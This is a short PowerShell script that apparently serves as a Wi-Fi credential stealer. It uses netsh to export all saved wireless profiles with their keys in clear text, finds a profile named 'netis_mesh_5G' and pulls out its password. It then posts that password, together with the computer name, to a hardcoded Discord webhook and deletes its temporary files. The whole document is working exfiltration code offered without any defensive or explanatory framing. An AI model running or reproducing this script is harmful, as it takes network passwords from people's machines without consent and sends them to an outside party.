$target = "netis_mesh_5G"
$hookUrl = "https://discordapp.com/api/webhooks/1465987971466395773/oYnAK6pdTATSbadnkw-2fraAguGL88gI9NIlKnXijZlkFMeiDmgtgq-VevctXFzQ4C9O"
$content = 
$tempDir = Join-Path $env:TEMP ("wifi_profiles_" + [guid]::NewGuid())
New-Item -ItemType Directory -Path $tempDir | Out-Null

try {
    netsh wlan export profile key=clear folder="$tempDir" | Out-Null

    $xmlFiles = Get-ChildItem -Path $tempDir -Filter "*.xml"
    foreach ($file in $xmlFiles) {
        [xml]$xml = Get-Content $file.FullName

        $ssid = $xml.WLANProfile.name
        $auth = $xml.WLANProfile.MSM.security.authEncryption.authentication
        $passwordNode = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial
        
        if($ssid -eq $target){
            if($passwordNode){
                $password = $passwordNode
            }else{
                if ($auth -eq "open") {
                    $password = "(open network)"
                }
                else {
                    $password = "(no stored key)"
                }
            }

            $payload = @{
                content = "# $env:COMPUTERNAME`n"+$password
            } | ConvertTo-Json
            Invoke-RestMethod -Uri $hookUrl -Method Post -Body $payload -ContentType "application/json"
            
            break
        }
    }
}
finally {
    Remove-Item -Recurse -Force -Path $tempDir
}
